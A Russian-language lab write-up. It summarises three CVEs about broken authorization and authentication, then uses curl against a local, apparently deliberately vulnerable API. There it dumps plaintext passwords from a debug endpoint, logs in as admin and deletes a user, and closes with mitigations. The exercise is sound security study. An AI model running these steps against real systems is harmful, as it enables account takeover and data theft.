# Часть 1

### 1) CVE-2025-6187

В bSecure plugin для  WordPress эндпоинт /webhook/v2/order_info/ всегда выдавал true для проверки авторизации, что позволяло злоумышленнику знающему почту пользователя получить его куки и притвориться этим пользователем. В разрезе OWASP REST TOP 10 это Broken Function Level Authorization, так как функция (эндпоинт) доступна неавторизованному пользователю.

###  2) CVE-2025-69221

LibreChat (клон ChatGPT) не проверяет авторизован ли пользователь на просмотр конфигурации какого-либо агента, даже приватного. Если злоумышленник знает идентификатор агента, то он может просмотреть его конфигурацию, разрешенные действия и то с какими аккаунтами он связан. Это Broken Object Level Authorization, так как не проверяются права пользователя на доступ к конкретному объекту (в этом случае настройкам агента).

###  3) CVE-2025-62714

В Karmada Dashboard, панели для управления кластерами, API эндпоинты (условно /api/v1/secret, /api/v1/service) не имели никакой аутентификации или авторизации и были доступны всем (хоть web UI и требовал JWT для доступа). Это позволяло злоумышленникам получать конфиденциальные данные: ключи и секреты. Это Broken Authentication, так как эндпоинты вообще не требовали никакой аутентификации.

# Часть 2

**Обращаемся к приложению: curl localhost:8080**
{ "создать базу": "/createdb",     "посмотреть информацию обо всех пользователях": "/users/v1",     "посмотреть подробную информацию обо всех пользователях": "/users/v1/_debug",     "регистрация нового пользователя": "/users/v1/register (HTTP POST)",     "вход в приложение": "/users/v1/login (HTTP POST)",     "просмотр пользователя по имени": "/users/v1/{username}",     "удалить пользователя по имени (только для админов)": "/users/v1/{username} (HTTP DELETE)",     "изменить email пользователя": "/users/v1/{username}/email (HTTP PUT)",     "изменить пароль пользователя": "/users/v1/{username}/password (HTTP PUT)",     "все книги": "/books/v1",     "добавить книгу": "/books/v1 (HTTP POST)",     "просмотр книги": "/books/v1/{book}",  }
**Заполняем базу через /createdb**

**Посмотрим информацию о юзерах (/users/v1):**
{"users":\[{"email":"mail1@mail.com","username":"name1"},{"email":"mail2@mail.com","username":"name2"},{"email":"admin@mail.com","username":"admin"}]}
**Видим почты всех пользователей - это нехорошо**

**Попробуем полную информацию через /users/v1/_debug:**
{"users":\[{"admin":false,"email":"mail1@mail.com","password":"pass1","username":"name1"},{"admin":false,"email":"mail2@mail.com","password":"pass2","username":"name2"},{"admin":true,"email":"admin@mail.com","password":"pass1","username":"admin"}]}
Вообще всё плохо!

**Можем залогиниться под любым пользователем**
curl localhost:8080/users/v1/login --json '{"username":"name1", "password":"pass1"}'
{"auth_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzcyMDY2OTIsImlhdCI6MTc3NzIwNjYzMiwic3ViIjoibmFtZTEifQ.iC-0w6Q9PVcexIyoaLbeJXSp1ikzXL8v4GGXnRw7XtI", "message": "Successfully logged in.", "status": "success"}

**И даже под админом!**
~$ curl localhost:8080/users/v1/login --json '{"username":"admin", "password":"pass1"}'
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzcyMDgwNDYsImlhdCI6MTc3NzIwNzk4Niwic3ViIjoiYWRtaW4ifQ.WUBbw7r1zvVEU5rLhE9K_JUnfcpd0KAwKnT6dA__rxE", "message": "Successfully logged in.", "status": "success"}

**Зайдем под обычным пользователем name2**
~$ curl -X POST localhost:8080/users/v1/login --json '{"username":"name2", "password":"pass2"}'
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzcyMjQzMTIsImlhdCI6MTc3NzIyNDI1Miwic3ViIjoibmFtZTIifQ.fzYHSGyTq2JJUlwfW8086aK22wWc-gXNWns-_-axxcY", "message": "Successfully logged in.", "status": "success"}
**И попробуем поменять чужую почту:**
~$ curl -X PUT localhost:8080/users/v1/name1/email --json '{"email":"hacked123123@hacked.com"}' -H "Authorization: Bearer $USERTOKEN"
~$ curl localhost:8080/users/v1/_debug
{"users":\[{"admin":false,"email":"mail1@mail.com","password":"pass1","username":"name1"},{"admin":false,"email":"hacked123123@hacked.com","password":"pass2","username":"name2"},{"admin":true,"email":"admin@mail.com","password":"pass1","username":"admin"}]}
**Не получилось, все равно поменяли свою почту**

**Попробуем совершить вещи которые может только админ (удаление аккаунта)**
~$ curl -X DELETE  localhost:8080/users/v1/name1 -H "Authorization: Bearer $ADMINTOKEN"
{"message": "User deleted.", "status": "success"}%                                                                                                       ~$ curl localhost:8080/users/v1
{"users":\[{"email":"mail2@mail.com","username":"name2"},{"email":"example@ex.com","username":"admin"}]}
**Да, у нас и в правду есть права админа**

**Тогда попробуем удалить аккаунт даже не от имени админа**
$ curl -X DELETE  localhost:8080/users/v1/name2 -H "Authorization: Bearer $USERTOKEN" 
{ "status": "fail", "message": "Only Admins may delete users!"}
**Значит токен админа как-то отличается от токена обычного пользователя.**

**Итог: представленная здесь уязвимость - Broken Function Level Authorization, так как мы можем вызвать /users/v1/_debug, который (предположительно) должен быть открыт только для админов. Меры предотвращения:**

- **проверять авторизован ли пользователь с на совершение действия**

- **убрать поле password из возвращаемых**
- **вообще убрать этот эндпоинт из прод версии**